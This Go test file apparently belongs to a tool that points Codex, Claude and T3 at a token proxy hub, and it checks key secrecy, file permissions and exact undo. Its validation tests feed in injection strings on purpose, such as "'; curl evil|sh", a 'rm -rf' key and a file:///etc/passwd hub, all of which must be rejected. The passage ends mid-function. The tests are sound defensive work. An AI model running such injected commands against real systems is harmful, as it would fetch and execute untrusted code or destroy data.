package connect

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/router-for-me/CLIProxyAPI/v8/internal/tpr/home"
	"github.com/router-for-me/CLIProxyAPI/v8/internal/tpr/setup"
)

const (
	testKey = "sk-tpr-testkey1234"
	testT3  = "tpr-codex"
)

type world struct {
	env     Env
	hub     *httptest.Server
	home    string
	setxLog []string
	// registry is the fake saved value of TPR_API_KEY; nil means it is not set.
	registry map[string]string
}

func newWorld(t *testing.T) *world {
	t.Helper()
	dir := t.TempDir()
	userHome := filepath.Join(dir, "user")
	if err := os.MkdirAll(userHome, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv(home.EnvHome, filepath.Join(userHome, ".token-proxy-router"))
	hub := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/models" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		if r.Header.Get("Authorization") != "Bearer "+testKey {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		_, _ = w.Write([]byte(`{"data":[]}`))
	}))
	t.Cleanup(hub.Close)
	w := &world{home: userHome, hub: hub}
	w.env = Env{
		UserHome: userHome,
		T3Home:   filepath.Join(userHome, ".t3"),
		GOOS:     "linux",
		Shell:    "/bin/bash",
		HTTP:     hub.Client(),
		LookPath: func(string) (string, error) { return "", errors.New("not on PATH") },
		Run: func(_ context.Context, name string, args ...string) ([]byte, []byte, error) {
			w.setxLog = append(w.setxLog, name+" "+strings.Join(args, " "))
			// A small stand-in for the user's saved environment on Windows.
			switch {
			case name == "setx":
				w.registry = map[string]string{"type": "REG_SZ", "value": args[1]}
			case name == "reg" && args[0] == "query":
				if w.registry == nil {
					return nil, []byte("ERROR: not found"), errors.New("exit status 1")
				}
				return []byte("\r\nHKEY_CURRENT_USER\\Environment\r\n    TPR_API_KEY    " + w.registry["type"] + "    " + w.registry["value"] + "\r\n\r\n"), nil, nil
			case name == "reg" && args[0] == "delete":
				w.registry = nil
			case name == "reg" && args[0] == "add":
				w.registry = map[string]string{"type": args[5], "value": args[7]}
			}
			return nil, nil, nil
		},
	}
	return w
}

func (w *world) write(t *testing.T, relative, content string) string {
	t.Helper()
	path := filepath.Join(w.home, relative)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func read(t *testing.T, path string) string {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// snapshotTree captures every file and folder under a path, except TPR's folder.
func snapshotTree(t *testing.T, root string) map[string]string {
	t.Helper()
	tree := map[string]string{}
	err := filepath.WalkDir(root, func(path string, entry os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		relative, _ := filepath.Rel(root, path)
		if strings.HasPrefix(relative, ".token-proxy-router") {
			return nil
		}
		if entry.IsDir() {
			tree[relative] = "<dir>"
			return nil
		}
		info, err := entry.Info()
		if err != nil {
			return err
		}
		tree[relative] = info.Mode().String() + "|" + read(t, path)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return tree
}

func assertSameTree(t *testing.T, before, after map[string]string) {
	t.Helper()
	for path, want := range before {
		if got, ok := after[path]; !ok {
			t.Errorf("%s is gone", path)
		} else if got != want {
			t.Errorf("%s differs:\nwant %q\n got %q", path, want, got)
		}
	}
	for path := range after {
		if _, ok := before[path]; !ok {
			t.Errorf("%s was left behind", path)
		}
	}
}

func (w *world) connect(t *testing.T, mutate func(*Options)) string {
	t.Helper()
	var out bytes.Buffer
	opts := Options{Hub: w.hub.URL, Key: testKey, Out: &out}
	if mutate != nil {
		mutate(&opts)
	}
	if err := Run(context.Background(), w.env, opts); err != nil {
		t.Fatalf("connect: %v\n%s", err, out.String())
	}
	if strings.Contains(out.String(), testKey) {
		t.Fatalf("the key must never be printed:\n%s", out.String())
	}
	return out.String()
}

const existingCodex = `# my settings
model = "gpt-test"  # keep me

[model_providers.other]
name = "Other"
base_url = "https://example.com/v1"

[profiles.work]
model = "gpt-other"

[notice]
hide = true
`

const existingClaude = `{
    "theme": "dark",
    "env": {
        "FOO": "bar",
        "ANTHROPIC_BASE_URL": "https://previous.example.com"
    },
    "permissions": {"allow": ["Bash(ls:*)"], "number": 1.50}
}
`

const existingT3 = `{
  "theme": "system",
  "providerInstances": {
    "my-other": {"driver": "codex", "displayName": "Mine", "enabled": false, "environment": []}
  },
  "other": [1, 2, 3]
}
`

func TestConnectAllToolsThenUndoIsByteForByte(t *testing.T) {
	w := newWorld(t)
	codexPath := w.write(t, ".codex/config.toml", existingCodex)
	claudePath := w.write(t, ".claude/settings.json", existingClaude)
	t3Path := w.write(t, ".t3/userdata/settings.json", existingT3)
	w.write(t, ".bashrc", "# my bashrc\nalias ll='ls -l'")
	w.write(t, ".profile", "# my profile\n")
	before := snapshotTree(t, w.home)

	output := w.connect(t, nil)
	for _, want := range []string{"Hub OK", "changed:", "always goes through the hub", "restart T3 Code", "codex --profile tpr", "--undo"} {
		if !strings.Contains(output, want) {
			t.Errorf("output lacks %q:\n%s", want, output)
		}
	}

	codex := read(t, codexPath)
	for _, want := range []string{"# my settings", `model = "gpt-test"  # keep me`, "[model_providers.other]", "[profiles.work]", "[notice]",
		"[model_providers.tpr]", `base_url = "` + w.hub.URL + `/v1"`, `wire_api = "responses"`, `env_key = "TPR_API_KEY"`, "[profiles.tpr]"} {
		if !strings.Contains(codex, want) {
			t.Errorf("codex config lacks %q:\n%s", want, codex)
		}
	}
	if strings.Contains(codex, `model_provider = "tpr"`+"\n[") || rootKeyLine(strings.Split(codex, "\n"), codexDefaultKey) >= 0 {
		t.Errorf("the default provider must not change without --default:\n%s", codex)
	}

	var claude map[string]any
	if err := json.Unmarshal([]byte(read(t, claudePath)), &claude); err != nil {
		t.Fatal(err)
	}
	env := claude["env"].(map[string]any)
	if env["FOO"] != "bar" || env["ANTHROPIC_BASE_URL"] != w.hub.URL || env["ANTHROPIC_AUTH_TOKEN"] != testKey {
		t.Errorf("claude env = %v", env)
	}
	if claude["theme"] != "dark" || claude["permissions"] == nil {
		t.Errorf("claude settings lost data: %v", claude)
	}
	if !strings.Contains(read(t, claudePath), `1.50`) || !strings.HasPrefix(read(t, claudePath), "{\n    \"theme\"") {
		t.Errorf("claude formatting not preserved:\n%s", read(t, claudePath))
	}
	if runtime.GOOS != "windows" {
		info, _ := os.Stat(claudePath)
		if info.Mode().Perm() != 0o600 {
			t.Errorf("settings hold a secret, so should be owner-only, got %o", info.Mode().Perm())
		}
	}

	var t3 struct {
		Theme     string                     `json:"theme"`
		Instances map[string]json.RawMessage `json:"providerInstances"`
		Other     []int                      `json:"other"`
	}
	if err := json.Unmarshal([]byte(read(t, t3Path)), &t3); err != nil {
		t.Fatal(err)
	}
	if t3.Theme != "system" || len(t3.Other) != 3 || len(t3.Instances) != 3 || !strings.Contains(string(t3.Instances["my-other"]), `"Mine"`) {
		t.Errorf("t3 settings = %+v", t3)
	}
	if strings.Contains(read(t, t3Path), testKey) {
		t.Fatal("the key must not be in T3 settings")
	}
	var codexInstance t3Instance
	if err := json.Unmarshal(t3.Instances[t3CodexInstance], &codexInstance); err != nil {
		t.Fatal(err)
	}
	if codexInstance.Driver != "codex" || codexInstance.DisplayName != "Router: Codex" || !codexInstance.Enabled {
		t.Errorf("codex instance = %+v", codexInstance)
	}
	wantArgs := "-c model_provider=tpr -c model_providers.tpr.name=TokenProxyRouter -c model_providers.tpr.base_url=" + w.hub.URL + "/v1 -c model_providers.tpr.env_key=TPR_API_KEY -c model_providers.tpr.wire_api=responses"
	if codexInstance.Config["launchArgs"] != wantArgs {
		t.Errorf("launchArgs = %q", codexInstance.Config["launchArgs"])
	}
	if !codexInstance.Environment[0].Sensitive || !codexInstance.Environment[0].ValueRedacted || codexInstance.Environment[0].Value != "" {
		t.Errorf("env = %+v", codexInstance.Environment)
	}
	var claudeInstance t3Instance
	if err := json.Unmarshal(t3.Instances[t3ClaudeInstance], &claudeInstance); err != nil {
		t.Fatal(err)
	}
	if claudeInstance.Driver != "claudeAgent" || claudeInstance.Environment[0].Value != w.hub.URL || claudeInstance.Environment[0].Sensitive || !claudeInstance.Environment[1].Sensitive {
		t.Errorf("claude instance = %+v", claudeInstance)
	}

	for _, secret := range []string{
		filepath.Join(w.home, ".t3", "userdata", "secrets", "provider-env-dHByLWNvZGV4-VFBSX0FQSV9LRVk.bin"),
		filepath.Join(w.home, ".t3", "userdata", "secrets", "provider-env-dHByLWNsYXVkZQ-QU5USFJPUElDX0FVVEhfVE9LRU4.bin"),
	} {
		if read(t, secret) != testKey {
			t.Errorf("secret %s has the wrong bytes", secret)
		}
		if runtime.GOOS != "windows" {
			info, _ := os.Stat(secret)
			if info.Mode().Perm() != 0o600 {
				t.Errorf("secret mode %o", info.Mode().Perm())
			}
		}
	}

	envFile := filepath.Join(home.Dir(), "env")
	if !strings.Contains(read(t, envFile), "export TPR_API_KEY='"+testKey+"'") {
		t.Error("env file should hold the key")
	}
	for _, profile := range []string{".bashrc", ".profile"} {
		if !strings.Contains(read(t, filepath.Join(w.home, profile)), `. "$HOME/.token-proxy-router/env" # added by tpr connect`) {
			t.Errorf("%s lacks the include:\n%s", profile, read(t, filepath.Join(w.home, profile)))
		}
	}

	var out bytes.Buffer
	if err := Undo(context.Background(), w.env, &out); err != nil {
		t.Fatalf("undo: %v\n%s", err, out.String())
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
	if _, err := os.Stat(envFile); !os.IsNotExist(err) {
		t.Error("env file should be gone")
	}
	if _, err := os.Stat(connectDir()); !os.IsNotExist(err) {
		t.Error("journal should be gone")
	}
}

func TestConnectOnCleanMachineThenUndoLeavesNothing(t *testing.T) {
	w := newWorld(t)
	before := snapshotTree(t, w.home)
	w.connect(t, func(o *Options) { o.Codex, o.Claude, o.T3 = true, true, true })
	if _, err := os.Stat(filepath.Join(w.home, ".codex", "config.toml")); err != nil {
		t.Fatal(err)
	}
	if err := Undo(context.Background(), w.env, nil); err != nil {
		t.Fatal(err)
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
}

func TestRepeatedConnectKeepsEarliestBackup(t *testing.T) {
	w := newWorld(t)
	w.write(t, ".codex/config.toml", existingCodex)
	w.write(t, ".bashrc", "# rc\n")
	before := snapshotTree(t, w.home)
	first := w.connect(t, func(o *Options) { o.Codex = true })
	if !strings.Contains(first, "changed:") {
		t.Fatal(first)
	}
	second := w.connect(t, func(o *Options) { o.Codex = true })
	if strings.Contains(second, "changed:") {
		t.Fatalf("the same connect again should change nothing:\n%s", second)
	}
	if strings.Count(read(t, filepath.Join(w.home, ".bashrc")), profileMarker) != 1 {
		t.Fatal("profile include should not repeat")
	}
	if strings.Count(read(t, filepath.Join(w.home, ".codex", "config.toml")), "[model_providers.tpr]") != 1 {
		t.Fatal("codex tables should not repeat")
	}
	// A different hub rewrites in place, and undo still returns to the original.
	other := httptest.NewServer(w.hub.Config.Handler)
	defer other.Close()
	var out bytes.Buffer
	if err := Run(context.Background(), w.env, Options{Hub: other.URL, Key: testKey, Codex: true, Out: &out}); err != nil {
		t.Fatal(err)
	}
	config := read(t, filepath.Join(w.home, ".codex", "config.toml"))
	if !strings.Contains(config, other.URL) || strings.Contains(config, w.hub.URL) {
		t.Fatalf("hub not replaced:\n%s", config)
	}
	if err := Undo(context.Background(), w.env, nil); err != nil {
		t.Fatal(err)
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
}

func TestDefaultFlagSetsAndUndoRestoresProvider(t *testing.T) {
	w := newWorld(t)
	path := w.write(t, ".codex/config.toml", "model_provider = \"openai\"\nmodel = \"x\"\n\n[a]\nb = 1\n")
	w.write(t, ".bashrc", "")
	before := snapshotTree(t, w.home)
	w.connect(t, func(o *Options) { o.Codex, o.Default = true, true })
	config := read(t, path)
	if !strings.Contains(config, `model_provider = "tpr"`) || strings.Contains(config, `model_provider = "openai"`) {
		t.Fatalf("config:\n%s", config)
	}
	if _, err := parseTOML([]byte(config)); err != nil {
		t.Fatalf("invalid toml: %v\n%s", err, config)
	}
	if err := Undo(context.Background(), w.env, nil); err != nil {
		t.Fatal(err)
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
}

func TestDryRunWritesNothing(t *testing.T) {
	w := newWorld(t)
	w.write(t, ".codex/config.toml", existingCodex)
	w.write(t, ".claude/settings.json", existingClaude)
	w.write(t, ".t3/userdata/settings.json", existingT3)
	w.write(t, ".bashrc", "# rc\n")
	before := snapshotTree(t, w.home)
	output := w.connect(t, func(o *Options) { o.DryRun = true })
	if !strings.Contains(output, "would change:") || strings.Contains(output, "  changed:") {
		t.Fatalf("output:\n%s", output)
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
	if _, err := os.Stat(home.Dir()); !os.IsNotExist(err) {
		t.Fatal("dry run must not create the data folder")
	}
}

func TestDetectsOnlyInstalledTools(t *testing.T) {
	w := newWorld(t)
	w.write(t, ".claude/settings.json", "{}\n")
	w.connect(t, nil)
	if _, err := os.Stat(filepath.Join(w.home, ".codex")); !os.IsNotExist(err) {
		t.Fatal("codex is not installed and must not be touched")
	}
	if _, err := os.Stat(filepath.Join(w.home, ".t3")); !os.IsNotExist(err) {
		t.Fatal("t3 is not installed and must not be touched")
	}
}

func TestNoToolsFoundIsAClearError(t *testing.T) {
	w := newWorld(t)
	err := Run(context.Background(), w.env, Options{Hub: w.hub.URL, Key: testKey})
	if err == nil || !strings.Contains(err.Error(), "--codex") {
		t.Fatalf("err = %v", err)
	}
}

func TestExplicitFlagLimitsTools(t *testing.T) {
	w := newWorld(t)
	codexPath := w.write(t, ".codex/config.toml", existingCodex)
	w.connect(t, func(o *Options) { o.Claude = true })
	if read(t, codexPath) != existingCodex {
		t.Fatal("--claude must leave codex alone")
	}
}

func TestBadHubAndKeyChangeNothing(t *testing.T) {
	cases := []struct {
		name string
		hub  func(*world) string
		key  string
		want string
	}{
		{"wrong key", func(w *world) string { return w.hub.URL }, "sk-wrong", "rejected"},
		{"unreachable", func(*world) string { return "http://127.0.0.1:1" }, testKey, "could not reach"},
		{"not a hub", func(w *world) string { return w.hub.URL + "/nope" }, testKey, "really a Token Proxy Router"},
		{"no scheme", func(*world) string { return "example.com" }, testKey, "not a hub address"},
		{"bad scheme", func(*world) string { return "file:///etc/passwd" }, testKey, "not a hub address"},
		{"empty hub", func(*world) string { return "" }, testKey, "required"},
		{"quote in hub", func(*world) string { return `https://evil.example.com/"` }, testKey, "not safe"},
		{"newline in hub", func(*world) string { return "https://evil.example.com/\nfoo" }, testKey, ""},
		{"empty key", func(w *world) string { return w.hub.URL }, " ", "required"},
		{"space in key", func(w *world) string { return w.hub.URL }, "a b", "not safe"},
		{"toml injection in key", func(w *world) string { return w.hub.URL }, `x"; rm -rf`, "not safe"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			w := newWorld(t)
			w.write(t, ".codex/config.toml", existingCodex)
			before := snapshotTree(t, w.home)
			err := Run(context.Background(), w.env, Options{Hub: tc.hub(w), Key: tc.key, Codex: true})
			if err == nil {
				t.Fatal("expected an error")
			}
			if tc.want != "" && !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err = %v", err)
			}
			if strings.Contains(err.Error(), testKey) {
				t.Fatal("errors must not contain the key")
			}
			assertSameTree(t, before, snapshotTree(t, w.home))
		})
	}
}

func TestHubURLVariantsAreNormalized(t *testing.T) {
	for _, raw := range []string{"https://h.example.com:8443", "https://h.example.com:8443/", "https://h.example.com:8443/v1", "https://h.example.com:8443/v1/", " https://h.example.com:8443 "} {
		got, err := NormalizeHub(raw)
		if err != nil || got != "https://h.example.com:8443" {
			t.Errorf("NormalizeHub(%q) = %q, %v", raw, got, err)
		}
	}
	if _, err := NormalizeHub("https://user:pw@h.example.com"); err == nil {
		t.Error("credentials in the URL must be rejected")
	}
}

func TestInvalidExistingFilesAreLeftAlone(t *testing.T) {
	for name, setupFile := range map[string]struct {
		relative, content string
		opts              func(*Options)
	}{
		"bad toml":         {".codex/config.toml", "not = = toml\n", func(o *Options) { o.Codex = true }},
		"bad claude json":  {".claude/settings.json", "{not json", func(o *Options) { o.Claude = true }},
		"claude env type":  {".claude/settings.json", `{"env": "nope"}`, func(o *Options) { o.Claude = true }},
		"bad t3 json":      {".t3/userdata/settings.json", "[1,2]", func(o *Options) { o.T3 = true }},
		"t3 not an object": {".t3/userdata/settings.json", `{"providerInstances": []}`, func(o *Options) { o.T3 = true }},
		"trailing garbage": {".claude/settings.json", `{} extra`, func(o *Options) { o.Claude = true }},
	} {
		t.Run(name, func(t *testing.T) {
			w := newWorld(t)
			w.write(t, setupFile.relative, setupFile.content)
			before := snapshotTree(t, w.home)
			opts := Options{Hub: w.hub.URL, Key: testKey}
			setupFile.opts(&opts)
			if err := Run(context.Background(), w.env, opts); err == nil {
				t.Fatal("expected an error")
			}
			assertSameTree(t, before, snapshotTree(t, w.home))
		})
	}
}

func TestUndoKeepsEditsMadeAfterConnect(t *testing.T) {
	w := newWorld(t)
	codexPath := w.write(t, ".codex/config.toml", existingCodex)
	claudePath := w.write(t, ".claude/settings.json", existingClaude)
	t3Path := w.write(t, ".t3/userdata/settings.json", existingT3)
	rcPath := w.write(t, ".bashrc", "# rc\n")
	w.connect(t, nil)

	appendTo := func(path, extra string) {
		t.Helper()
		f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0)
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = f.Close() }()
		if _, err := f.WriteString(extra); err != nil {
			t.Fatal(err)
		}
	}
	appendTo(codexPath, "\n[later]\nkey = 1\n")
	appendTo(rcPath, "export LATER=1\n")
	var claude map[string]any
	if err := json.Unmarshal([]byte(read(t, claudePath)), &claude); err != nil {
		t.Fatal(err)
	}
	claude["later"] = true
	edited, _ := json.Marshal(claude)
	if err := os.WriteFile(claudePath, edited, 0o600); err != nil {
		t.Fatal(err)
	}
	var t3 map[string]any
	if err := json.Unmarshal([]byte(read(t, t3Path)), &t3); err != nil {
		t.Fatal(err)
	}
	t3["later"] = true
	t3["providerInstances"].(map[string]any)["added-later"] = map[string]any{"driver": "codex"}
	edited, _ = json.Marshal(t3)
	if err := os.WriteFile(t3Path, edited, 0o600); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	if err := Undo(context.Background(), w.env, &out); err != nil {
		t.Fatalf("undo: %v\n%s", err, out.String())
	}
	if !strings.Contains(out.String(), "your edits were kept") {
		t.Fatalf("output:\n%s", out.String())
	}

	codex := read(t, codexPath)
	if strings.Contains(codex, "[model_providers.tpr]") || strings.Contains(codex, "[profiles.tpr]") {
		t.Errorf("tpr tables remain:\n%s", codex)
	}
	if !strings.Contains(codex, "[later]") || !strings.Contains(codex, "[model_providers.other]") || !strings.Contains(codex, "# my settings") {
		t.Errorf("edits lost:\n%s", codex)
	}
	if _, err := parseTOML([]byte(codex)); err != nil {
		t.Errorf("invalid toml: %v", err)
	}

	rc := read(t, rcPath)
	if strings.Contains(rc, profileMarker) || !strings.Contains(rc, "LATER") {
		t.Errorf("rc:\n%s", rc)
	}

	if err := json.Unmarshal([]byte(read(t, claudePath)), &claude); err != nil {
		t.Fatal(err)
	}
	env := claude["env"].(map[string]any)
	if claude["later"] != true || env["FOO"] != "bar" {
		t.Errorf("claude = %v", claude)
	}
	if _, ok := env["ANTHROPIC_AUTH_TOKEN"]; ok {
		t.Error("token must be removed")
	}
	if env["ANTHROPIC_BASE_URL"] != "https://previous.example.com" {
		t.Errorf("the earlier base URL should come back, got %v", env["ANTHROPIC_BASE_URL"])
	}

	if err := json.Unmarshal([]byte(read(t, t3Path)), &t3); err != nil {
		t.Fatal(err)
	}
	instances := t3["providerInstances"].(map[string]any)
	if _, ok := instances[testT3]; ok || instances["added-later"] == nil || instances["my-other"] == nil || t3["later"] != true {
		t.Errorf("t3 = %v", t3)
	}
}

func TestUndoNothingToDo(t *testing.T) {
	w := newWorld(t)
	var out bytes.Buffer
	if err := Undo(context.Background(), w.env, &out); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "Nothing to undo") {
		t.Fatal(out.String())
	}
}

func TestWindowsUsesSetxAndUndoRemovesIt(t *testing.T) {
	w := newWorld(t)
	w.env.GOOS = "windows"
	w.write(t, ".codex/config.toml", existingCodex)
	before := snapshotTree(t, w.home)
	output := w.connect(t, func(o *Options) { o.Codex = true })
	if !slices.Contains(w.setxLog, "setx TPR_API_KEY "+testKey) {
		t.Fatalf("calls = %v", w.setxLog)
	}
	if !strings.Contains(output, "new terminal") {
		t.Fatalf("output:\n%s", output)
	}
	if _, err := os.Stat(filepath.Join(home.Dir(), "env")); !os.IsNotExist(err) {
		t.Fatal("no env file on Windows")
	}
	if err := Undo(context.Background(), w.env, nil); err != nil {
		t.Fatal(err)
	}
	if w.setxLog[len(w.setxLog)-1] != `reg delete HKCU\Environment /v TPR_API_KEY /f` {
		t.Fatalf("calls = %v", w.setxLog)
	}
	assertSameTree(t, before, snapshotTree(t, w.home))
}

func TestWindowsUndoRestoresAValueThatWasAlreadyThere(t *testing.T) {
	w := newWorld(t)
	w.env.GOOS = "windows"
	w.write(t, ".codex/config.toml", existingCodex)
	w.registry = map[string]string{"type": "REG_EXPAND_SZ", "value": "%USERPROFILE%\\my key"}
	w.connect(t, func(o *Options) { o.Codex = true })
	if w.registry["value"] != testKey {
		t.Fatalf("not replaced: %v", w.registry)
	}
	// A rerun must not lose the value from before the first connect.
	w.connect(t, func(o *Options) { o.Codex = true })
	if err := Undo(context.Background(), w.env, nil); err != nil {
		t.Fatal(err)
	}
	if w.registry["type"] != "REG_EXPAND_SZ" || w.registry["value"] != "%USERPROFILE%\\my key" {
		t.Fatalf("not restored: %v", w.registry)
	}
}

func TestWindowsUndoLeavesAValueTheUserChanged(t *testing.T) {
	w := newWorld(t)
	w.env.GOOS = "windows"
	w.write(t, ".codex/config.toml", existingCodex)
	w.connect(t, func(o *Options) { o.Codex = true })
	w.registry = map[string]string{"type": "REG_SZ", "value": "their-own-key"}
	var out bytes.Buffer
	if err := Undo(context.Background(), w.env, &out); err != nil {
		t.Fatal(err)
	}
	if w.registry == nil || w.registry["value"] != "their-own-key" {
		t.Fatalf("the user's value was changed: %v", w.registry)
	}
	if !strings.Contains(out.String(), "left as is") {
		t.Fatal(out.String())
	}
}

func TestParseRegQuery(t *testing.T) {
	for _, tc := range []struct {
		name, output, valueType, value string
		ok                             bool
	}{
		{"plain", "\r\nHKEY_CURRENT_USER\\Environment\r\n    TPR_API_KEY    REG_SZ    abc\r\n", "REG_SZ", "abc", true},
		{"spaces in the value", "    TPR_API_KEY    REG_EXPAND_SZ    a b  c\r\n", "REG_EXPAND_SZ", "a b  c", true},
		{"a value containing a type name", "    TPR_API_KEY    REG_SZ    REG_SZ x\r\n", "REG_SZ", "REG_SZ x", true},
		{"another variable", "    TPR_API_KEY_OLD    REG_SZ    abc\r\n", "", "", false},
		{"empty", "", "", "", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			valueType, value, ok := parseRegQuery(tc.output, "TPR_API_KEY")
			if ok != tc.ok || valueType != tc.valueType || value != tc.value {
				t.Fatalf("got %q %q %v", valueType, value, ok)
			}
		})
	}
}

func TestT3HomeOverride(t *testing.T) {
	w := newWorld(t)
	w.env.T3Home = filepath.Join(w.home, "custom-t3")
	w.connect(t, func(o *Options) { o.T3 = true })
	if !strings.Contains(read(t, filepath.Join(w.home, "custom-t3", "userdata", "settings.json")), "tpr-claude") {
		t.Fatal("settings not at the override")
	}
	if _, err := os.Stat(filepath.Join(w.home, ".t3")); !os.IsNotExist(err) {
		t.Fatal("default location must not be used")
	}
}

func TestSymlinkedDotfileStaysALink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on Windows")
	}
	w := newWorld(t)
	realFile := w.write(t, "dotfiles/settings.json", "{}\n")
	link := filepath.Join(w.home, ".claude", "settings.json")
	if err := os.MkdirAll(filepath.Dir(link), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(realFile, link); err != nil {
		t.Fatal(err)
	}
	w.connect(t, func(o *Options) { o.Claude = true })
	info, err := os.Lstat(link)
	if err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Fatal("the link should survive")
	}
	if !strings.Contains(read(t, realFile), claudeToken) {
		t.Fatal("the real file should change")
	}
}

func TestMergeCodexPreservesCRLF(t *testing.T) {
	merged, err := MergeCodex([]byte("a = 1\r\n\r\n[b]\r\nc = 2\r\n"), "https://h.example.com", false)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ReplaceAll(string(merged), "\r\n", ""), "\n") {
		t.Fatalf("mixed line endings: %q", merged)
	}
}

func TestMergeCodexReplacesExistingTablesInPlace(t *testing.T) {
	original := "[model_providers.tpr]\nname = \"Old\"\nbase_url = \"https://old.example.com/v1\"\nextra = 1\n\n# about b\n[b]\nc = 2\n"
	merged, err := MergeCodex([]byte(original), "https://new.example.com", false)
	if err != nil {
		t.Fatal(err)
	}
	text := string(merged)
	if strings.Contains(text, "old.example.com") || !strings.Contains(text, "new.example.com") {
		t.Fatalf("not replaced:\n%s", text)
	}
	if !strings.Contains(text, "# about b\n[b]\nc = 2") {
		t.Fatalf("next table's comment should stay with it:\n%s", text)
	}
	if strings.Index(text, "[model_providers.tpr]") > strings.Index(text, "[b]") {
		t.Fatalf("should replace in place:\n%s", text)
	}
}

func TestMergeCodexRefusesConflictingDefinition(t *testing.T) {
	_, err := MergeCodex([]byte("[model_providers]\ntpr = { name = \"x\" }\n"), "https://h.example.com", false)
	if err == nil {
		t.Fatal("expected an error for a conflicting definition")
	}
}

func TestMergeCodexIgnoresHeadersInMultilineStrings(t *testing.T) {
	original := "note = \"\"\"\n[model_providers.tpr]\nnot a table\n\"\"\"\n\n[a]\nb = 1\n"
	merged, err := MergeCodex([]byte(original), "https://h.example.com", false)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(merged), "not a table") {
		t.Fatalf("string content changed:\n%s", merged)
	}
	parsed, err := parseTOML(merged)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(parsed["note"].(string), "[model_providers.tpr]") {
		t.Fatalf("note = %v", parsed["note"])
	}
}

func TestBuildSnippets(t *testing.T) {
	snippets, err := BuildSnippets("https://h.example.com:8443/", testKey)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(snippets.Linux, "| sh -s -- connect --hub https://h.example.com:8443 --key "+testKey) {
		t.Errorf("linux = %s", snippets.Linux)
	}
	if !strings.Contains(snippets.Windows, "$env:TPR_INSTALL_ARGS='connect --hub https://h.example.com:8443 --key "+testKey+"'") || !strings.Contains(snippets.Windows, "| iex") {
		t.Errorf("windows = %s", snippets.Windows)
	}
	if !strings.Contains(snippets.CodexEnv, codexEnvKey+"="+testKey) || !strings.Contains(snippets.CodexEnvWindows, "setx "+codexEnvKey+" "+testKey) {
		t.Errorf("codex key steps = %q %q", snippets.CodexEnv, snippets.CodexEnvWindows)
	}
	if snippets.CodexRun != "codex --profile tpr" {
		t.Errorf("codex run = %q", snippets.CodexRun)
	}
	if !strings.Contains(snippets.CodexTOML, `base_url = "https://h.example.com:8443/v1"`) {
		t.Errorf("toml = %s", snippets.CodexTOML)
	}
	if !strings.Contains(snippets.ClaudeEnv, "export ANTHROPIC_AUTH_TOKEN="+testKey) || !strings.Contains(snippets.ClaudeEnv, "export ANTHROPIC_BASE_URL=https://h.example.com:8443") {
		t.Errorf("claude = %s", snippets.ClaudeEnv)
	}
	if !strings.Contains(snippets.ClaudeEnvWindows, "$env:ANTHROPIC_AUTH_TOKEN='"+testKey+"'") {
		t.Errorf("claude windows = %s", snippets.ClaudeEnvWindows)
	}
	if !strings.Contains(snippets.T3, "--t3") {
		t.Errorf("t3 = %s", snippets.T3)
	}
	if _, err := BuildSnippets("https://h.example.com'; curl evil|sh", testKey); err == nil {
		t.Error("shell metacharacters in the hub must be rejected")
	}
	if _, err := BuildSnippets("https://h.example.com", "x'; curl evil|sh"); err == nil {
		t.Error("shell metacharacters in the key must be rejected")
	}
}

func routeEngine(t *testing.T, config string) *gin.Engine {
	t.Helper()
	dir := t.TempDir()
	t.Setenv(home.EnvHome, dir)
	t.Setenv("PATH", dir)
	path := filepath.Join(dir, "config.yaml")
	if err := os.WriteFile(path, []byte(config), 0o600); err != nil {
		t.Fatal(err)
	}
	setup.SetActiveConfigPath(path)
	t.Cleanup(func() { setup.SetActiveConfigPath("") })
	gin.SetMode(gin.TestMode)
	engine := gin.New()
	engine.GET("/connect", handleConnect)
	engine.POST("/connect/snippets", handleSnippets)
	return engine
}

func TestConnectRouteHidesKeys(t *testing.T) {
	engine := routeEngine(t, "host: \"127.0.0.1\"\nport: 8317\napi-keys: [\""+testKey+"\"]\n")
	rr := httptest.NewRecorder()
	engine.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/connect", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d body=%s", rr.Code, rr.Body)
	}
	if strings.Contains(rr.Body.String(), testKey) {
		t.Fatalf("GET /connect must not contain the key: %s", rr.Body)
	}
	var body struct {
		HubURLs []HubURL  `json:"hub_urls"`
		Keys    []KeyInfo `json:"keys"`
		Install struct {
			Linux   string `json:"linux"`
			Windows string `json:"windows"`
		} `json:"install"`
	}
	if err := json.Unmarshal(rr.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
